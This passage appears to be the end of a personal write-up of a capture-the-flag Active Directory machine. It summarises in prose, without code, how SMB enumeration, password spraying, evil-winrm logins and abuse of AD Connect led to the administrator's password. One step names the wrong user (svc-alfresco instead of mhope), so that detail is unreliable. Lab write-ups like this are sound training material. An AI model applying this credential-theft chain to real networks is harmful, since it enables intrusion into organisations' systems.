<li><strong>enumerate</strong> <code>SMB</code> anonymously -&gt; revealed the <code>domain password policy</code> via enum4linux</li>
</ol>
<h4 id="foothold_1">Foothold</h4>
<ol>
<li><code>password spraying</code> was performed to find creds for our collected valid users, found valid domain creds for one user (SABatchJobs)</li>
<li><strong>enumerate</strong> <code>SMB</code> as user SABatchJobs, found <code>plaintext password</code></li>
<li><code>correlated</code> the found password with user mhope as this user can remotely login with the <code>win-rm</code> service</li>
<li><strong>logged in</strong> via evil-winrm to host using on user <strong>svc-alfresco</strong>, and grabbed the <mark>user flag</mark>.</li>
</ol>
<h4 id="privesc_1">Privesc</h4>
<ol>
<li>Run <strong>bloodhound</strong>, and found that the compromised user (mhope) is member of <code>AZURE_ADMINS</code> group</li>
<li><strong>Inspected</strong> the <code>Program Files</code> of the host to find <code>azure related installed programs</code>, found <code>AD Connect</code> related programs, as indicated by the ldap enum from one of the valid users (AAD_sth)</li>
<li><code>Abused AD Connect</code> via a powershell script i found that <code>extracts credentials</code> from AD connect, which revealed the administrator's password as plaintext</li>
<li>using administrator's password we <strong>login</strong> via evil-winrm and grab the <mark>root flag</mark>!</li>
</ol>
<hr />
<h1 id="sidenotes">Sidenotes</h1>
<p>This was a machine i wont forget, mainly because this was my first time having to abuse AD Connect. Besides that part, no new attack vectors were introduced here.</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs", "search.highlight", "toc.sticky", "toc.follow", "content.code.copy", "navigation.top", "navigation.external"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
      
        <script src="../assets/javascripts/interactive_graph.js"></script>
      
        <script src="../assets/javascripts/obsidian_tags.js"></script>
      
    
  </body>
</html>